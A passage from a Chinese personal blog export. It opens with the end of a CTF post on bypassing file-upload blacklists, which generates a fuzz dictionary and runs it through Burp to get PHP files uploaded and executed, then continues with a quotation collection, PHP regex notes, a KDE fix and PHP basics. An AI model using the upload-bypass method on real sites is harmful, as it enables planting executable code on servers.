<h2 id="利用工具实现FUZZ"><a href="#利用工具实现FUZZ" class="headerlink" title="利用工具实现FUZZ"></a>利用工具实现FUZZ</h2><p>很多网站对上传进行拦截的时候采取的是黑名单校验，当我们看到黑名单的时候就可以考虑采取修改后缀、截断等方式尝试绕过。</p>
<p>采用工具 <a href="https://github.com/c0ny1/upload-fuzz-dic-builder" target="_blank" rel="noopener">https://github.com/c0ny1/upload-fuzz-dic-builder</a> 来生成fuzz的字典。执行命令:</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">python</span> <span class="selector-tag">upload-fuzz-dic-builder</span><span class="selector-class">.py</span> <span class="selector-tag">-n</span> <span class="selector-tag">test</span> <span class="selector-tag">-a</span> <span class="selector-tag">jpg</span> <span class="selector-tag">-l</span> <span class="selector-tag">php</span> <span class="selector-tag">-m</span> <span class="selector-tag">apache</span> <span class="selector-tag">--os</span> <span class="selector-tag">win</span> <span class="selector-tag">-o</span> <span class="selector-tag">upload_file</span><span class="selector-class">.txt</span></span><br></pre></td></tr></table></figure>

<p>把生成的字典导入burp中，同时取消payload-encoding的选中状态。执行后可以看到有些php文件上传成功。然后访问其中上传成功的文件，查看是否执行。</p>
]]></content>
      <categories>
        <category>网络安全</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>妙语集III</title>
    <url>/2020/11/15/%E5%A6%99%E8%AF%AD%E9%9B%86III/</url>
    <content><![CDATA[<p>周围人们有趣言论的碎片集合。第三辑。</p>
<a id="more"></a>

<ul>
<li>你我都身处在150g的世界。</li>
</ul>
<div style="text-align: right"><i>by 杏美@bilibili</i></div><hr/>

<ul>
<li>墙说一件事，挺重要的。就是吧，我觉得平时要是帮助了你就不要说谢谢大佬之类的，我不是一个虚荣的人，不喜欢听这种话，也觉得会和大家拉开了很大距离。有时候我也只是个普通人, 就正常感谢一下我就好了，所以我自己心里有一点隔应，知道的的人应该都知道我是谁，所以匿了吧。就是希望大家平时能够正常交流,拥有良好的学习氛围罢了，大家问题的时候也不必太过自卑了，妄自菲薄的风气我觉得真的不是很好，大家都是同一个年级的人，为什么要这么看不起自己呢, 挺阴阳的。我也是真诚地希望你们所有人能好好地活着啊，开心一点嘛，认真生活，好好爱人。</li>
</ul>
<div style="text-align: right"><i>by 匿名@撕逼墙</i></div><hr/>

<ul>
<li>有些人明白他们不该粗鲁或傲慢的提问并要求得到答复，但他们选择另一个极端 —— 低声下气：我知道我只是个可悲的新手，一个撸瑟，但…。这既使人困扰，也没有用，尤其是伴随着与实际问题含糊不清的描述时更令人反感。别用原始灵长类动物的把戏来浪费你我的时间。取而代之的是，尽可能清楚地描述背景条件和你的问题情况。这比低声下气更好地定位了你的位置。有时网页论坛会设有专为新手提问的版面，如果你真的认为遇到了初学者的问题，到那去就是了，但一样别那么低声下气。</li>
</ul>
<div style="text-align: right"><i>by 提问的艺术</i></div><hr/>

<ul>
<li>没有一个民主自由、追求公平的政治制度作保证，技术的进步只会带来权力和财富进一步的不公。使用现代技术进行大数据极权的[<del>自主规制</del>]，对社会的破坏力和对人民的掠夺远超历史上任何一个封建皇朝。</li>
</ul>
<div style="text-align: right"><i>by Hirah Tang@Telegram</i></div><hr/>

<ul>
<li>We hold these truths to be self-evident, that all men are created equal, that they are endowed by their Creator with certain unalienable Rights, that among these are Life, Liberty and the pursuit of Happiness. </li>
</ul>
<div style="text-align: right"><i>by 独立宣言</i></div><hr/>

<ul>
<li>我们将在没有黑暗的地方相见。</li>
</ul>
<div style="text-align: right"><i>by George Orwell@1984</i></div><hr/>]]></content>
      <categories>
        <category>悠哉日常</category>
      </categories>
      <tags>
        <tag>妙语集</tag>
      </tags>
  </entry>
  <entry>
    <title>正则学习笔记</title>
    <url>/2020/06/16/%E6%AD%A3%E5%88%99%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<p>CTF中经常出现的正则，基础薄弱。突击学习下记点笔记。</p>
<a id="more"></a>

<h2 id="PHP正则"><a href="#PHP正则" class="headerlink" title="PHP正则"></a>PHP正则</h2><p>PCRE库函数中，正则匹配模式使用分隔符与元字符组成。</p>
<h3 id="分隔符"><a href="#分隔符" class="headerlink" title="分隔符"></a>分隔符</h3><p>分隔符可以是非数字、非反斜线、非空格的任意字符。经常使用的分隔符是正斜线(/)、hash符号(#) 以及取反符号(~)，例如：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">/foo bar/</span><br><span class="line"><span class="comment">#^[^0-9]$#</span></span><br><span class="line">~php~</span><br></pre></td></tr></table></figure>

<p>如果模式中包含分隔符，则分隔符需要使用反斜杠（\）进行转义。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">/http:\/\<span class="comment">//</span></span><br></pre></td></tr></table></figure>

<p>如果模式中包含较多的分割字符，建议更换其他的字符作为分隔符，也可以采用preg_quote进行转义。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$p = <span class="string">'http://'</span>;</span><br><span class="line">$p = <span class="string">'/'</span>.preg_quote($p, <span class="string">'/'</span>).<span class="string">'/'</span>;</span><br><span class="line"><span class="keyword">echo</span> $p;</span><br></pre></td></tr></table></figure>

<p>除了上面提到的分隔符，也可以使用括号样式的分隔符，左括号和右括号分别作为开始和结束 分隔符。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&#123;this is a pattern&#125;</span><br></pre></td></tr></table></figure>

<p>分隔符后面可以使用模式修饰符（i，m，s，x等）。例如使用 i 修饰符可以忽略大小写匹配：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$str = <span class="string">"Http://www.imooc.com/"</span>;</span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">'/http/i'</span>, $str)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'匹配成功'</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="元字符"><a href="#元字符" class="headerlink" title="元字符"></a>元字符</h3><p> 一些字符被赋予 特殊的涵义，使其不再单纯的代表自己，模式中的这种有特殊涵义的编码字符 称为 <em>元字符</em>。</p>
<p>共有两种不同的元字符：一种是可以在模式中方括号外任何地方使用的，另外一种 是需要在方括号内使用的。</p>
<p><strong>在方括号外使用的元字符如下：</strong></p>
<ul>
<li><p>**</p>
<p>一般用于转义字符</p>
</li>
<li><p><em>^</em></p>
<p>断言目标的开始位置(或在多行模式下是行首)</p>
</li>
<li><p><em>$</em></p>
<p>断言目标的结束位置(或在多行模式下是行尾)</p>
</li>
<li><p><em>.</em></p>
<p>匹配除换行符外的任何字符(默认)</p>
</li>
<li><p><em>[</em></p>
<p>开始字符类定义</p>
</li>
<li><p><em>]</em></p>
<p>结束字符类定义</p>
</li>
<li><p><em>|</em></p>
<p>开始一个可选分支</p>
</li>
<li><p><em>(</em></p>
<p>子组的开始标记</p>
</li>
<li><p><em>)</em></p>
<p>子组的结束标记</p>
</li>
<li><p><em>?</em></p>
<p>作为量词，表示 0 次或 1 次匹配。位于量词后面用于改变量词的贪婪特性。 (查阅<a href="https://www.php.net/manual/zh/regexp.reference.repetition.php" target="_blank" rel="noopener">量词</a>)</p>
</li>
<li><p><em>*</em></p>
<p>量词，0 次或多次匹配</p>
</li>
<li><p><em>+</em></p>
<p>量词，1 次或多次匹配</p>
</li>
<li><p><em>{</em></p>
<p>自定义量词开始标记</p>
</li>
<li><p><em>}</em></p>
<p>自定义量词结束标记</p>
</li>
</ul>
<p><strong>模式中方括号内的部分称为“字符类”。 在一个字符类中仅有以下可用元字符：</strong></p>
<ul>
<li><p>**</p>
<p>转义字符</p>
</li>
<li><p><em>^</em></p>
<p>仅在作为第一个字符(方括号内)时，表明字符类取反</p>
</li>
<li><p><em>-</em></p>
<p>标记字符范围</p>
</li>
</ul>
<h3 id="转义序列"><a href="#转义序列" class="headerlink" title="转义序列"></a>转义序列</h3><p><em>\n</em></p>
<p>换行 (十六进制 0A)</p>
<p><em>\r</em></p>
<p>回车 (十六进制 0D)</p>
<p><em>\t</em></p>
<p>水平制表符 (十六进制 09)</p>
<p><em>\xhh</em></p>
<p>hh十六进制编码的字符，详细查看<a href="https://www.php.net/manual/zh/regexp.reference.unicode.php" target="_blank" rel="noopener">unicode properties</a> 属性</p>
<p><em>\ddd</em></p>
<p>ddd八进制编码的字符，或者后向引用</p>
<p><em>\040</em></p>
<p>空格的另外一种用法</p>
<p><em>\40</em></p>
<p>当提供了少于40个子组时也认为是空格。</p>
<p><em>\d</em></p>
<p>任意十进制数字</p>
<p><em>\D</em></p>
<p>任意非十进制数字</p>
<p><em>\h</em></p>
<p>任意水平空白字符(since PHP 5.2.4)</p>
<p><em>\H</em></p>
<p>任意非水平空白字符(since PHP 5.2.4)</p>
<p><em>\s</em></p>
<p>任意空白字符</p>
<p><em>\S</em></p>
<p>任意非空白字符</p>
<p><em>\v</em></p>
<p>任意垂直空白字符(since PHP 5.2.4)</p>
<p><em>\V</em></p>
<p>任意非垂直空白字符(since PHP 5.2.4)</p>
<p><em>\w</em></p>
<p>任意单词字符</p>
<p><em>\W</em></p>
<p>任意非单词字符</p>
<p><em>\b</em></p>
<p>单词边界</p>
<p><em>\B</em></p>
<p>非单词边界</p>
<p><em>\A</em></p>
<p>目标的开始位置(独立于多行模式)</p>
<p><em>\Z</em></p>
<p>目标的结束位置或结束处的换行符(独立于多行模式)</p>
<p><em>\z</em></p>
<p>目标的结束位置(独立于多行模式)</p>
<p><em>\G</em></p>
<p>在目标中首次匹配位置</p>
<h3 id="字符类"><a href="#字符类" class="headerlink" title="字符类"></a>字符类</h3><p>方括号标记开始结束。一个按类而不是按顺序匹配的规则。如</p>
<p>[A-Z0-9]可以匹配A-Z或0-9之中的所有内容，而不是按顺序先匹配字母再匹配数字。</p>
<h3 id="可选路径"><a href="#可选路径" class="headerlink" title="可选路径"></a>可选路径</h3><p>竖线用于分离模式中的可选路径。 比如模式<em>gilbert|Sullivan</em>匹配 ”gilbert” 或者 ”sullivan”。匹配的处理从左到右尝试每一个可选路径，并且使用第一个成功匹配的。</p>
<h3 id="修饰符"><a href="#修饰符" class="headerlink" title="修饰符"></a>修饰符</h3><table>
<thead>
<tr>
<th><em>i</em></th>
<th>不区分大小写（ignore） for <a href="https://www.php.net/manual/zh/reference.pcre.pattern.modifiers.php" target="_blank" rel="noopener">PCRE_CASELESS</a></th>
</tr>
</thead>
<tbody><tr>
<td><em>m</em></td>
<td>多行匹配（more） for <a href="https://www.php.net/manual/zh/reference.pcre.pattern.modifiers.php" target="_blank" rel="noopener">PCRE_MULTILINE</a></td>
</tr>
<tr>
<td><em>s</em></td>
<td>句点使用时匹配包含换行符 for <a href="https://www.php.net/manual/zh/reference.pcre.pattern.modifiers.php" target="_blank" rel="noopener">PCRE_DOTALL</a></td>
</tr>
<tr>
<td><em>x</em></td>
<td>将模式中的空白忽略 for <a href="https://www.php.net/manual/zh/reference.pcre.pattern.modifiers.php" target="_blank" rel="noopener">PCRE_EXTENDED</a></td>
</tr>
<tr>
<td><em>U</em></td>
<td>只匹配最近的一个字符串;不重复匹配 for <a href="https://www.php.net/manual/zh/reference.pcre.pattern.modifiers.php" target="_blank" rel="noopener">PCRE_UNGREEDY</a></td>
</tr>
<tr>
<td><em>X</em></td>
<td>任意反斜线后接没有特殊含义的字符会导致一个错误 for <a href="https://www.php.net/manual/zh/reference.pcre.pattern.modifiers.php" target="_blank" rel="noopener">PCRE_EXTRA</a></td>
</tr>
<tr>
<td><em>J</em></td>
<td>允许子组重名 for <a href="https://www.php.net/manual/zh/reference.pcre.pattern.modifiers.php" target="_blank" rel="noopener">PCRE_INFO_JCHANGED</a></td>
</tr>
</tbody></table>
<p>e was <em>DEPRECATED</em> in PHP 5.5.0, and <em>REMOVED</em> as of PHP 7.0.0. 如果设置了这个被弃用的修饰符， <a href="https://www.php.net/manual/zh/function.preg-replace.php" target="_blank" rel="noopener">preg_replace()</a> 在进行了对替换字符串的 后向引用替换之后, 将替换后的字符串作为php 代码评估执行(eval 函数方式)，并使用执行结果 作为实际参与替换的字符串。单引号、双引号、反斜线(**)和 NULL 字符在 后向引用替换时会被用反斜线转义.详见php手册。</p>
<p><em>A</em> (<em>PCRE_ANCHORED</em>)  如果设置了这个修饰符，模式被强制为”锚定”模式，也就是说约束匹配使其仅从 目标字符串的开始位置搜索。这个效果同样可以使用适当的模式构造出来，并且 这也是 perl 种实现这种模式的唯一途径。</p>
<p><em>U</em> (<em>PCRE_UNGREEDY</em>)  这个修饰符逆转了量词的”贪婪”模式。 使量词默认为非贪婪的，通过量词后紧跟*?* 的方式可以使其成为贪婪的。这和 perl 是不兼容的。 它同样可以使用 <a href="https://www.php.net/manual/zh/regexp.reference.internal-options.php" target="_blank" rel="noopener">模式内修饰符设置</a> (<em>?U</em>)进行设置， 或者在量词后以问号标记其非贪婪(比如*.*?*)。</p>
<h3 id="子组"><a href="#子组" class="headerlink" title="子组"></a>子组</h3><p>子组通过圆括号分隔界定，并且它们可以嵌套。 将一个模式中的一部分标记为子组(子模式)主要是来做两件事情：</p>
<ol>
<li>将可选分支局部化。比如，模式*cat(arcat|erpillar|)*匹配 ”cat”， “cataract”， “caterpillar” 中的一个，如果没有圆括号的话，它匹配的则是 ”cataract”， “erpillar” 以及空字符串。</li>
<li>将子组设定为捕获子组(向上面定义的)。当整个模式匹配后， 目标字符串中匹配子组的部分将会通过 <strong>pcre_exec()()</strong> 的 <em>ovector</em> 参数回传给调用者。 左括号从左至右出现的次序就是对应子组的下标(从 1 开始)， 可以通过这些下标数字来获取捕获子模式匹配结果。</li>
</ol>
<p>为了方便简写，如果需要在非捕获子组开始位置设置选项， 选项字母可以位于 ? 和 : 之间，比如：</p>
<figure class="highlight clojure"><table><tr><td class="code"><pre><span class="line">(<span class="name">?i:saturday</span>|sunday)</span><br><span class="line">(<span class="name">?:</span>(<span class="name">?i</span>)saturday|sunday)</span><br></pre></td></tr></table></figure>

<h3 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h3><p>字符序列(?#标记开始一个注释直到遇到一个右括号。不允许嵌套括号。 注释中的字符不会作为模式的一部分参与匹配。如：<code>/te(?# comments)st/</code></p>
<h3 id="递归模式"><a href="#递归模式" class="headerlink" title="递归模式"></a>递归模式</h3><p> (?R) 套个娃。</p>
<h3 id="贪婪模式与懒惰模式"><a href="#贪婪模式与懒惰模式" class="headerlink" title="贪婪模式与懒惰模式"></a>贪婪模式与懒惰模式</h3><p>正则表达式中每个元字符匹配一个字符，当使用+之后将会变的贪婪，它将匹配尽可能多的字符，但使用问号?字符时，它将尽可能少的匹配字符，既是懒惰模式。</p>
<ul>
<li>贪婪模式：在可匹配与可不匹配的时候，优先匹配<br> //下面的\d表示匹配数字</li>
</ul>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$p = <span class="string">'/\d+\-\d+/'</span>;</span><br><span class="line">$str = <span class="string">"我的电话是010-12345678"</span>;</span><br><span class="line">preg_match($p, $str, $match);</span><br><span class="line"><span class="keyword">echo</span> $match[<span class="number">0</span>]; <span class="comment">//结果为：010-12345678</span></span><br></pre></td></tr></table></figure>

<ul>
<li>懒惰模式：在可匹配与可不匹配的时候，优先不匹配</li>
</ul>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$p = <span class="string">'/\d?\-\d?/'</span>;</span><br><span class="line">$str = <span class="string">"我的电话是010-12345678"</span>;</span><br><span class="line">preg_match($p, $str, $match);</span><br><span class="line"><span class="keyword">echo</span> $match[<span class="number">0</span>]; <span class="comment">//结果为：0-1</span></span><br></pre></td></tr></table></figure>

<p>当我们确切的知道所匹配的字符长度的时候，可以使用{}指定匹配字符数</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$p = <span class="string">'/\d&#123;3&#125;\-\d&#123;8&#125;/'</span>;</span><br><span class="line">$str = <span class="string">"我的电话是010-12345678"</span>;</span><br><span class="line">preg_match($p, $str, $match);</span><br><span class="line"><span class="keyword">echo</span> $match[<span class="number">0</span>]; <span class="comment">//结果为：010-12345678</span></span><br></pre></td></tr></table></figure>

<h3 id="使用正则进行匹配"><a href="#使用正则进行匹配" class="headerlink" title="使用正则进行匹配"></a>使用正则进行匹配</h3><p>preg_match用来执行一个匹配，可以简单的用来判断模式是否匹配成功，或者取得一个匹配结果，他的返回值是匹配成功的次数0或者1，在匹配到1次以后就会停止搜索。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$subject = <span class="string">"abcdef"</span>;</span><br><span class="line">$pattern = <span class="string">'/def/'</span>;</span><br><span class="line">preg_match($pattern, $subject, $matches);</span><br><span class="line">print_r($matches); <span class="comment">//结果为：Array ( [0] =&gt; def )</span></span><br></pre></td></tr></table></figure>

<p>上面的代码简单的执行了一个匹配，简单的判断def是否能匹配成功，但是正则表达式的强大的地方是进行模式匹配，因此更多的时候，会使用模式：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$subject = <span class="string">"abcdef"</span>;</span><br><span class="line">$pattern = <span class="string">'/a(.*?)d/'</span>;</span><br><span class="line">preg_match($pattern, $subject, $matches);</span><br><span class="line">print_r($matches); <span class="comment">//结果为：Array ( [0] =&gt; abcd [1] =&gt; bc )</span></span><br></pre></td></tr></table></figure>

<h3 id="查找所有匹配结果"><a href="#查找所有匹配结果" class="headerlink" title="查找所有匹配结果"></a>查找所有匹配结果</h3><p>preg_match只能匹配一次结果，但很多时候我们需要匹配所有的结果，preg_match_all可以循环获取一个列表的匹配结果数组。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="variable">$p</span> = <span class="string">"|&lt;[^&gt;]+&gt;(.*?)&lt;/[^&gt;]+&gt;|i"</span>;</span><br><span class="line"><span class="variable">$str</span> = <span class="string">"&lt;b&gt;example: &lt;/b&gt;&lt;div align=left&gt;this is a test&lt;/div&gt;"</span>;</span><br><span class="line">preg_match_all(<span class="variable">$p</span>, <span class="variable">$str</span>, <span class="variable">$matches</span>);</span><br><span class="line">print_r(<span class="variable">$matches</span>);</span><br></pre></td></tr></table></figure>

<p>可以使用preg_match_all匹配一个表格中的数据：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">$p = "/<span class="tag">&lt;<span class="name">tr</span>&gt;</span><span class="tag">&lt;<span class="name">td</span>&gt;</span>(.*?)<span class="tag">&lt;<span class="name">\</span>/<span class="attr">td</span>&gt;</span>\s*<span class="tag">&lt;<span class="name">td</span>&gt;</span>(.*?)<span class="tag">&lt;<span class="name">\</span>/<span class="attr">td</span>&gt;</span>\s*<span class="tag">&lt;<span class="name">\</span>/<span class="attr">tr</span>&gt;</span>/i";</span><br><span class="line">$str = "<span class="tag">&lt;<span class="name">table</span>&gt;</span> <span class="tag">&lt;<span class="name">tr</span>&gt;</span><span class="tag">&lt;<span class="name">td</span>&gt;</span>Eric<span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">td</span>&gt;</span>25<span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;/<span class="name">tr</span>&gt;</span> <span class="tag">&lt;<span class="name">tr</span>&gt;</span><span class="tag">&lt;<span class="name">td</span>&gt;</span>John<span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">td</span>&gt;</span>26<span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;/<span class="name">tr</span>&gt;</span> <span class="tag">&lt;/<span class="name">table</span>&gt;</span>";</span><br><span class="line">preg_match_all($p, $str, $matches);</span><br><span class="line">print_r($matches);</span><br></pre></td></tr></table></figure>

<p>$matches结果排序为$matches[0]保存完整模式的所有匹配, $matches[1] 保存第一个子组的所有匹配，以此类推。</p>
<h3 id="正则表达式的搜索和替换"><a href="#正则表达式的搜索和替换" class="headerlink" title="正则表达式的搜索和替换"></a>正则表达式的搜索和替换</h3><p>正则表达式的搜索与替换在某些方面具有重要用途，比如调整目标字符串的格式，改变目标字符串中匹配字符串的顺序等。</p>
<p>例如我们可以简单的调整字符串的日期格式：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$string = <span class="string">'April 15, 2014'</span>;</span><br><span class="line">$pattern = <span class="string">'/(\w+) (\d+), (\d+)/i'</span>;</span><br><span class="line">$replacement = <span class="string">'$3, $&#123;1&#125; $2'</span>;</span><br><span class="line"><span class="keyword">echo</span> preg_replace($pattern, $replacement, $string); <span class="comment">//结果为：2014, April 15</span></span><br></pre></td></tr></table></figure>

<p>其中${1}与$1的写法是等效的，表示第一个匹配的字串，$2代表第二个匹配的。</p>
<p>通过复杂的模式，我们可以更加精确的替换目标字符串的内容。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$patterns = <span class="keyword">array</span> (<span class="string">'/(19|20)(\d&#123;2&#125;)-(\d&#123;1,2&#125;)-(\d&#123;1,2&#125;)/'</span>,</span><br><span class="line">                   <span class="string">'/^\s*&#123;(\w+)&#125;\s*=/'</span>);</span><br><span class="line">$replace = <span class="keyword">array</span> (<span class="string">'\3/\4/\1\2'</span>, <span class="string">'$\1 ='</span>);<span class="comment">//\3等效于$3,\4等效于$4，依次类推</span></span><br><span class="line"><span class="keyword">echo</span> preg_replace($patterns, $replace, <span class="string">'&#123;startDate&#125; = 1999-5-27'</span>); <span class="comment">//结果为：$startDate = 5/27/1999</span></span><br></pre></td></tr></table></figure>

<p>//详细解释下结果：(19|20)表示取19或者20中任意一个数字，(\d{2})表示两个数字，(\d{1,2})表示1个或2个数字，(\d{1,2})表示1个或2个数字。^\s*{(\w+)\s*=}表示以任意空格开头的，并且包含在{}中的字符，并且以任意空格结尾的，最后有个=号的。<br>用正则替换来去掉多余的空格与字符：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="variable">$str</span> = <span class="string">'one     two'</span>;</span><br><span class="line"><span class="variable">$str</span> = preg_replace(<span class="string">'/\s+/'</span>, <span class="string">' '</span>, <span class="variable">$str</span>);</span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$str</span>; // 结果改变为<span class="string">'one two'</span></span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>网络安全</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>正则</tag>
      </tags>
  </entry>
  <entry>
    <title>解决更改Plasma桌面后KDE系统设置无法打开的问题</title>
    <url>/2020/09/11/%E8%A7%A3%E5%86%B3%E6%9B%B4%E6%94%B9Plasma%E6%A1%8C%E9%9D%A2%E5%90%8EKDE%E7%B3%BB%E7%BB%9F%E8%AE%BE%E7%BD%AE%E6%97%A0%E6%B3%95%E6%89%93%E5%BC%80%E7%9A%84%E9%97%AE%E9%A2%98/</url>
    <content><![CDATA[<p>更新 Manjaro Linux(KDE) 的 Plasma 主题包之后发现系统设置无法打开的解决方案。</p>
<a id="more"></a>

<h1 id="问题描述"><a href="#问题描述" class="headerlink" title="问题描述"></a>问题描述</h1><p>在 Manjaro Linux 下配置 KDE Plasma 的时候更换了McMojave 主题。更换之后发现系统设置无法打开。猜测是由于主题的冲突导致的，于是猜测用切换成默认主题的方式可以解决此问题。但是一般更换默认主题的方式都是从系统设置入手，找到外观选项再切换主题，现在系统设置的 GUI 界面无法打开，于是尝试用其它方法更换成默认主题。</p>
<h1 id="失败的尝试"><a href="#失败的尝试" class="headerlink" title="失败的尝试"></a>失败的尝试</h1><h2 id="用中文搜索相关内容"><a href="#用中文搜索相关内容" class="headerlink" title="用中文搜索相关内容"></a>用中文搜索相关内容</h2><p>什么也没有。中文使用地区对操作系统问题的相关支持还是太薄弱了，即使有相关内容也一般都是及其过时的只言片语，相反转而去搜索英文内容的时候发现相关支持非常多，还是差距挺大的。也算获得了经验，以后遇到问题宁可去啃英文的文档也要减少对中文的依赖。</p>
<h2 id="删除KDE设置项并重启"><a href="#删除KDE设置项并重启" class="headerlink" title="删除KDE设置项并重启"></a>删除KDE设置项并重启</h2><p>根据网络上的相关支持，将 <code>~/</code> 目录下的 <code>~/.kde/</code> 和 <code>~/.kde4/</code> 目录删除并重启，重启后发现 <code>~/.kde/</code> 目录自动生成了，其中的配置文件是根据当前主题的设置自动生成的。遂放弃。</p>
<h2 id="重新安装-plasma-desktop-和-plasma-meta"><a href="#重新安装-plasma-desktop-和-plasma-meta" class="headerlink" title="重新安装 plasma-desktop 和 plasma-meta"></a>重新安装 plasma-desktop 和 plasma-meta</h2><p>重新安装之后发现没有任何变化。</p>
<h1 id="成功的尝试"><a href="#成功的尝试" class="headerlink" title="成功的尝试"></a>成功的尝试</h1><h2 id="用命令行检查系统设置GUI程序的问题"><a href="#用命令行检查系统设置GUI程序的问题" class="headerlink" title="用命令行检查系统设置GUI程序的问题"></a>用命令行检查系统设置GUI程序的问题</h2><p>Konsole 中键入 <code>systemsettings5</code> 以尝试从命令行启动系统设置。发现输出错误：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">cyclic dependency detected between <span class="string">"file:///usr/lib/qt/qml/org/kde/kirigami.2/styles/org.kde.desktop.plasma/units.qml"</span> and <span class="string">"file:///usr/lib/qt/qml/org/kde/kirigami.2/styles/org.kde.desktop.plasma/units.qml"</span></span><br><span class="line">file:///usr/share/kpackage/genericqml/org.kde.systemsettings.sidebar/contents/ui/subcategorypage.qml:141:9: qml connections: implicitly defined onfoo properties <span class="keyword">in</span> connections are deprecated. use this syntax instead: <span class="keyword">function</span> onfoo(&lt;arguments&gt;) &#123; ... &#125;</span><br><span class="line">file:///usr/share/kpackage/genericqml/org.kde.systemsettings.sidebar/contents/ui/subcategorypage.qml:131:9: qml connections: implicitly defined onfoo properties <span class="keyword">in</span> connections are deprecated. use this syntax instead: <span class="keyword">function</span> onfoo(&lt;arguments&gt;) &#123; ... &#125;</span><br><span class="line">file:///usr/lib/qt/qml/org/kde/kirigami.2/private/refreshablescrollview.qml:143:13: qml connections: implicitly defined onfoo properties <span class="keyword">in</span> connections are deprecated. use this syntax instead: <span class="keyword">function</span> onfoo(&lt;arguments&gt;) &#123; ... &#125;</span><br><span class="line">file:///usr/lib/qt/qml/org/kde/kirigami.2/private/refreshablescrollview.qml:143:13: qml connections: implicitly defined onfoo properties <span class="keyword">in</span> connections are deprecated. use this syntax instead: <span class="keyword">function</span> onfoo(&lt;arguments&gt;) &#123; ... &#125; </span><br><span class="line">cyclic dependency detected between</span><br><span class="line"><span class="string">"file:///usr/lib/qt/qml/org/kde/kirigami.2/styles/org.kde.desktop.plasma/units.qml"</span> and</span><br><span class="line"><span class="string">"file:///usr/lib/qt/qml/org/kde/kirigami.2/styles/org.kde.desktop.plasma/units.qml"</span></span><br><span class="line">qqmlengine::setcontextforobject(): object already has a qqmlcontext qt.qpa.xcb:</span><br><span class="line">qxcbconnection: xcb error: 5 (badatom), sequence: 629, resource id: 0, major code: 20 (getproperty), minor code: 0</span><br></pre></td></tr></table></figure>

<p>似乎确定了问题是由于新采用的主题产生了循环依赖之类的问题。接下来考虑如何将主题更换回默认。</p>
<h2 id="从命令行将主题更换回-Breeze（默认主题）"><a href="#从命令行将主题更换回-Breeze（默认主题）" class="headerlink" title="从命令行将主题更换回 Breeze（默认主题）"></a>从命令行将主题更换回 Breeze（默认主题）</h2><p>使用 Konsole，键入 <code>systemsettings5 --style=Breeze</code>，绕过GUI界面从命令行直接更改主题。重启。系统设置可以打开，问题得到解决。</p>
<p>详请参见：<a href="https://www.reddit.com/r/kde/comments/i0m5gz/system_settings_wont_open_after_changing/" target="_blank" rel="noopener">https://www.reddit.com/r/kde/comments/i0m5gz/system_settings_wont_open_after_changing/</a></p>
<h1 id="感想"><a href="#感想" class="headerlink" title="感想"></a>感想</h1><p>中文社区的力量还是比较渺小，学英语真的很重要，英文社区啥都有（</p>
]]></content>
      <categories>
        <category>系统</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>KDE</tag>
      </tags>
  </entry>
  <entry>
    <title>PHP基础补完</title>
    <url>/2020/06/16/PHP%E5%9F%BA%E7%A1%80%E8%A1%A5%E5%AE%8C/</url>
    <content><![CDATA[<p>PHP基础太薄弱了。最近几天做个补完，记点笔记。</p>
<a id="more"></a>

<h2 id="PHP基础"><a href="#PHP基础" class="headerlink" title="PHP基础"></a>PHP基础</h2><p>PHP 脚本可以放在文档中的任何位置，以<code>&lt;?php</code>开始，以 <code>?&gt;</code> 结束，每个代码行都必须以分号结束。</p>
<p><code>//</code> 是单行注释，<code>/**/</code>是多行注释。</p>
<h2 id="PHP变量"><a href="#PHP变量" class="headerlink" title="PHP变量"></a>PHP变量</h2><h3 id="变量声明"><a href="#变量声明" class="headerlink" title="变量声明"></a>变量声明</h3><p>变量以 $ 开始，大小写敏感。没有声明变量的命令，在声明变量在首次给变量赋值的同时完成。</p>
<h3 id="作用域"><a href="#作用域" class="headerlink" title="作用域"></a>作用域</h3><p>变量的作用域是脚本中变量可被引用/使用的部分。</p>
<p>在所有函数外部定义的变量，拥有全局作用域。除了函数外，全局变量可以被脚本中的任何部分访问，<strong>要在一个函数中访问一个全局变量，需要使用 global 关键字</strong>。在 PHP 函数内部声明的变量是局部变量，仅能在函数内部访问。</p>
<p><strong>PHP中函数的花括号构成新的作用域。</strong>if和for的花括号并不构成新的作用域。</p>
<p>PHP 有四种不同的变量作用域：</p>
<ul>
<li>local：局部变量</li>
<li>global：全局变量</li>
<li>static：静态变量</li>
<li>parameter：函数参数</li>
</ul>
<h4 id="global"><a href="#global" class="headerlink" title="global"></a>global</h4><p>global 关键字用于<strong>函数内访问全局变量</strong>。要在函数内定义global变量需要先写global再声明。实例：</p>
